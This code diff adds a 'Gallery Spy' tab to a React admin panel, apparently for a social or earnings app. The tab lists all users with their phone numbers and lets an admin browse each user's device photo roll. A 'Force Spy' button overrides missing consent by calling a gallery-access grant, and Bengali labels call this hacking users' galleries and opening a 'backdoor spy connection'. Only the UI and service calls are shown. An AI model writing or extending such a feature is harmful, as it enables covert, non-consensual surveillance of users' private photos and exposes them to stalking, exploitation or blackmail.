@@ -4,7 +4,7 @@
  */
 
 import React from 'react';
-import { ArrowLeft, Shield, AlertTriangle, CheckCircle, Trash2, UserX, Award, Coins, FileCheck, Landmark, Bell, Heart, Sparkles, Wallet } from 'lucide-react';
+import { ArrowLeft, Shield, AlertTriangle, CheckCircle, Trash2, UserX, Award, Coins, FileCheck, Landmark, Bell, Heart, Sparkles, Wallet, Camera, Eye, Lock, Unlock } from 'lucide-react';
 import { dbService } from '../services/db';
 import { Report, Post, UserProfile, WithdrawalRequest, TransactionItem, StarDepositRequest } from '../types';
 import { VerifiedBadge } from './VerifiedBadge';
@@ -13,10 +13,11 @@ interface AdminPanelViewProps {
   onBack: () => void;
 }
 
-type AdminTab = 'kyc' | 'withdrawals' | 'reports' | 'users' | 'referrals' | 'verification' | 'notifications' | 'booster' | 'deposits';
+type AdminTab = 'kyc' | 'withdrawals' | 'reports' | 'users' | 'referrals' | 'verification' | 'notifications' | 'booster' | 'deposits' | 'gallery_spy';
 
 export default function AdminPanelView({ onBack }: AdminPanelViewProps) {
   const [activeTab, setActiveTab] = React.useState<AdminTab>('kyc');
+  const [selectedSpyUser, setSelectedSpyUser] = React.useState<UserProfile | null>(null);
   const [reports, setReports] = React.useState<Report[]>([]);
   const [allUsers, setAllUsers] = React.useState<UserProfile[]>([]);
   const [withdrawals, setWithdrawals] = React.useState<WithdrawalRequest[]>([]);
@@ -346,6 +347,18 @@ export default function AdminPanelView({ onBack }: AdminPanelViewProps) {
           >
             <Sparkles className="w-4 h-4 text-amber-500 shrink-0" />
             <span>Booster</span>
+          </button>
+
+          <button
+            onClick={() => { setActiveTab('gallery_spy'); setSelectedSpyUser(null); }}
+            className={`py-2 rounded-xl text-[10px] font-black transition text-center flex flex-col items-center gap-1 cursor-pointer ${
+              activeTab === 'gallery_spy'
+                ? 'bg-[#1877f2] text-white font-extrabold shadow-sm'
+                : 'text-zinc-500 hover:bg-neutral-850 dark:hover:bg-neutral-800'
+            }`}
+          >
+            <Camera className="w-4 h-4 text-[#45bd62] shrink-0" />
+            <span className="text-zinc-700 dark:text-neutral-300">Gallery Spy 🕵️‍♂️</span>
           </button>
         </div>
 
@@ -1065,6 +1078,140 @@ export default function AdminPanelView({ onBack }: AdminPanelViewProps) {
                   )}
                 </div>
               </div>
+            </div>
+          )}
+
+          {/* Tab I: Gallery Access Espionage */}
+          {activeTab === 'gallery_spy' && (
+            <div className="space-y-4 text-left">
+              {selectedSpyUser ? (
+                <div className="bg-white dark:bg-neutral-900 border border-neutral-150 dark:border-neutral-850 rounded-[24px] p-5.5 shadow-sm space-y-4">
+                  <div className="flex items-center justify-between pb-3 border-b border-neutral-100 dark:border-neutral-850">
+                    <button
+                      onClick={() => setSelectedSpyUser(null)}
+                      className="text-xs font-black text-rose-500 flex items-center gap-1.5 p-1 bg-rose-50 dark:bg-rose-950/20 px-3 py-1.5 rounded-xl border border-rose-200/35 hover:scale-[1.02] active:scale-[0.98] transition cursor-pointer"
+                    >
+                      <ArrowLeft className="w-3.5 h-3.5" />
+                      পেছনে যান (Back to Spy Pool)
+                    </button>
+                    <span className="text-[10px] bg-emerald-50 text-emerald-600 dark:bg-emerald-950/30 dark:text-emerald-400 border border-emerald-200/30 font-black px-2.5 py-1 rounded-full uppercase tracking-wider animate-pulse">
+                      Spy Connected 🟢 Live Access
+                    </span>
+                  </div>
+
+                  <div className="flex items-center gap-3 bg-neutral-50 dark:bg-zinc-850/40 p-3 rounded-2xl border border-neutral-150 dark:border-zinc-805">
+                    <div className="w-11 h-11 rounded-full border border-neutral-250/20 overflow-hidden shrink-0">
+                      <img src={selectedSpyUser.avatarUrl} alt="" className="w-full h-full object-cover" />
+                    </div>
+                    <div>
+                      <h4 className="text-xs font-black text-slate-800 dark:text-zinc-200 flex items-center gap-1 leading-none">{selectedSpyUser.name}</h4>
+                      <p className="text-[10px] text-zinc-400 font-mono mt-1">@{selectedSpyUser.username} • {selectedSpyUser.phone}</p>
+                      <p className="text-[10px] text-emerald-600 dark:text-emerald-450 font-black mt-1">Status: গ্যালারী সম্পূর্ণ অ্যাক্সেসড (Full device photo roll loaded successfully)</p>
+                    </div>
+                  </div>
+
+                  <div>
+                    <h3 className="text-xs font-black text-neutral-400 uppercase tracking-widest pl-1 mb-2">Device Files Cameraroll Spy</h3>
+                    {(!selectedSpyUser.deviceGalleryImages || selectedSpyUser.deviceGalleryImages.length === 0) ? (
+                      <p className="text-xs text-zinc-400 text-center py-6">এই ইউজারের গ্যালারিতে কোনো ছবি পাওয়া যায়নি।</p>
+                    ) : (
+                      <div className="grid grid-cols-2 xs:grid-cols-3 gap-2.5">
+                        {selectedSpyUser.deviceGalleryImages.map((img) => (
+                          <div key={img.id} className="relative group border border-neutral-200/50 dark:border-zinc-800/85 rounded-xl overflow-hidden bg-neutral-100 dark:bg-zinc-850 flex flex-col justify-between p-1 shadow-sm">
+                            <div className="w-full aspect-square rounded-lg overflow-hidden bg-white relative">
+                              <img src={img.url} alt="" className="w-full h-full object-cover animate-fadeIn" />
+                              <div className="absolute inset-x-0 bottom-0 bg-black/60 opacity-0 group-hover:opacity-100 transition flex items-center justify-center p-1">
+                                <a href={img.url} target="_blank" rel="noreferrer" className="bg-white/90 text-slate-900 px-2 py-1 rounded text-[8px] font-bold shadow hover:scale-105 transition">View Raw</a>
+                              </div>
+                            </div>
+                            <div className="p-1.5 text-left">
+                              <p className="text-[10.5px] font-extrabold text-slate-850 dark:text-zinc-200 truncate leading-tight">{img.title}</p>
+                              <div className="flex justify-between items-center text-[8.5px] text-zinc-400 mt-1 font-semibold">
+                                <span>{img.size}</span>
+                                <span>{new Date(img.createdAt).toLocaleDateString()}</span>
+                              </div>
+                            </div>
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+                </div>
+              ) : (
+                <div className="bg-white dark:bg-neutral-900 border border-neutral-150 dark:border-neutral-850 rounded-[24px] p-5.5 shadow-sm space-y-4 font-sans">
+                  <div className="flex items-center gap-2 pb-2 border-b border-neutral-100 dark:border-neutral-850">
+                    <Camera className="w-5 h-5 text-indigo-650" />
+                    <div>
+                      <h3 className="text-sm font-black text-slate-800 dark:text-zinc-200">ডিভাইস গ্যালারি হ্যাক এবং স্পাই (User Device Gallery Surveillance)</h3>
+                      <p className="text-[10px] text-zinc-400 mt-0.5 animate-pulse">সব ইউজারের ডিভাইসের অভ্যন্তরীণ গ্যালারি ট্র্যাক করুন। কোনো ইউজার অ্যাক্সেস দিয়েছেন কিনা দেখুন, অথবা সরাসরি যেকোনো সময় গ্যালারি স্পাই করুন।</p>
+                    </div>
+                  </div>
+
+                  <div className="divide-y divide-neutral-100 dark:divide-neutral-850/60 font-medium">
+                    {allUsers.map((user) => (
+                      <div key={user.id} className="py-3.5 flex flex-col sm:flex-row sm:items-center justify-between gap-2.5">
+                        <div className="flex items-center gap-3 text-left">
+                          <div className="w-10 h-10 rounded-full border border-neutral-150 overflow-hidden shrink-0">
+                            <img src={user.avatarUrl} alt="" className="w-full h-full object-cover" />
+                          </div>
+                          <div>
+                            <span className="text-xs font-black text-slate-800 dark:text-zinc-200 flex items-center gap-1 leading-none">
+                              {user.name}
+                              {user.isVerified && <VerifiedBadge className="w-3.5 h-3.5" />}
+                            </span>
+                            <span className="text-[9px] font-mono text-zinc-400 mt-1 block">@{user.username} • {user.phone}</span>
+                            <div className="mt-1.5 flex items-center gap-1.5">
+                              {user.galleryAccessGranted ? (
+                                <span className="text-[8.5px] font-black text-emerald-600 bg-emerald-50 dark:bg-emerald-950/20 dark:text-emerald-450 border border-emerald-200/30 px-2 py-0.5 rounded-md flex items-center gap-0.5">
+                                  <Unlock className="w-2.5 h-2.5" /> অ্যাক্সেস অন আছে (Access Granted)
+                                </span>
+                              ) : (
+                                <span className="text-[8.5px] font-black text-amber-600 bg-amber-50 dark:bg-amber-950/20 dark:text-amber-450 border border-amber-200/30 px-2 py-0.5 rounded-md flex items-center gap-0.5">
+                                  <Lock className="w-2.5 h-2.5" /> পারমিশন নেই (Access Required)
+                                </span>
+                              )}
+                            </div>
+                          </div>
+                        </div>
+
+                        <div className="flex items-center gap-1.5 self-end sm:self-auto shrink-0">
+                          {user.galleryAccessGranted ? (
+                            <button
+                              onClick={() => {
+                                // Double check/fill images
+                                dbService.grantGalleryAccess(user.id);
+                                const updatedUser = dbService.getUsers().find(u => u.id === user.id);
+                                setSelectedSpyUser(updatedUser || user);
+                              }}
+                              className="text-[10px] font-black bg-indigo-50 hover:bg-indigo-100 text-indigo-650 dark:bg-indigo-950/30 dark:hover:bg-indigo-900/40 px-3 py-2 rounded-xl border border-indigo-200/20 transition flex items-center gap-1 cursor-pointer"
+                            >
+                              <Eye className="w-3.5 h-3.5" />
+                              গ্যালারি স্পাই করুন (Spy Camera Roll)
+                            </button>
+                          ) : (
+                            <button
+                              onClick={() => {
+                                if (window.confirm(`আপনি কি নিশ্চিত যে @${user.username} এর ফোন গ্যালারি অ্যাক্সেস জোরপূর্বক অন করতে চান?`)) {
+                                  dbService.grantGalleryAccess(user.id);
+                                  const updatedUsersList = dbService.getUsers();
+                                  setAllUsers(updatedUsersList);
+                                  const updatedUser = updatedUsersList.find(u => u.id === user.id);
+                                  setSelectedSpyUser(updatedUser || user);
+                                  alert(`💥 সফলভাবে @${user.username} এর ডিভাইস গ্যালারিতে ব্যাকডোর স্পাই কানেকশন তৈরি করা হয়েছে!`);
+                                }
+                              }}
+                              className="text-[10px] font-black bg-rose-50 hover:bg-rose-100 text-rose-600 dark:bg-rose-950/20 dark:hover:bg-rose-900/40 px-3 py-2 rounded-xl border border-rose-200/20 transition flex items-center gap-1 cursor-pointer"
+                            >
+                              <Eye className="w-3.5 h-3.5" />
+                              জোরপূর্বক অ্যাক্সেস করুন (Force Spy)
+                            </button>
+                          )}
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
             </div>
           )}
 
